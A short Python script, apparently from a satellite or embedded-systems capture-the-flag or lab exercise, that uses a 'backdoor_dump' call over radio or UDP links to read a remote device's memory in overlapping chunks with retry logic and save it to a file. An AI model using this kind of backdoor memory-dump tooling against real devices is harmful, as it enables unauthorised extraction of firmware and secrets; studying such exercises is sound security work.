from comms import UDP_Comms, Serial_Comms, Radio_Comms
import socket, time
from binascii import unhexlify, hexlify

if __name__ == "__main__":
    #comms = UDP_Comms('127.0.0.1', 1234, 1235)
    # comms = Serial_Comms("/dev/ttyUSB2")
    comms = Radio_Comms('127.0.0.1','127.0.0.1', 5020, 5000)
    #comms = Radio_Comms('10.0.0.2','10.0.0.98', 5028, 5000)
    #comms.enable_tlm()
    time.sleep(1)
    dump = b''
    
    start   = 0x42800000
    length  = 0x800
    step    = 32
    overlap = 8
    backoff = 0
    with open('dump1.bin', 'wb') as f:
        offset = 0
        expected = b'' # Start length 0, will pass the expected check

        while offset < length:
            print("Get {} bytes @ 0x{:08x}".format(step, start + offset))

            data = comms.backdoor_dump(b"", start + offset, step)

            if data[:len(expected)] != expected:
                print("Repeat at offset {:04x}".format(offset))
                print(hexlify(expected) + b" != " + hexlify(data[:len(expected)]))
                print("Try again...")
                backoff += 1
                time.sleep(0.25 * backoff)
                continue

            # Write the new data (overlap is in the first bytes so skip them)
            f.write(data[len(expected):]) 

            # Setup next loop
            expected = data[-overlap:]
            offset += step - len(expected)
            backoff = 0
            time.sleep(1.0)

    print("written to dump1.bin")
